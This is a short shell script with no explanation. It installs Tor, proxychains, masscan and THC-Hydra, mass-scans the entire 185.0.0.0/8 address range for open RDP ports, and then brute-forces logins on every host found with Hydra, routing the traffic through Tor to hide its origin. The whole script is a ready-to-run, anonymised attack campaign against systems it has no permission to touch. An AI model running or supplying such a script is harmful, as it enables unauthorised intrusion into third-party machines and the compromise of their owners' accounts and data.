sudo apt update && sudo apt install tor proxychains build-essential cmake freerdp2-dev masscan libpcap-dev -y;
git clone https://github.com/FreeRDP/FreeRDP.git;
cd FreeRDP;
cmake CMakeLists.txt && make -j8 && sudo make install;
sudo pkill tor;
tor &
git clone https://github.com/vanhauser-thc/thc-hydra.git;
cd thc-hydra;
./configure && make -j8 && sudo make install;
cd ..;
sudo masscan --range 185.0.0.0-185.255.255.255 --rate 5000 -p3389 --open --banners -oG rdp.scan;
for i in `grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" rdp.scan`; do proxychains hydra -vv rdp://$i -e nsr -L user -P pass -t1 -W1 -I >hydra.log;
done
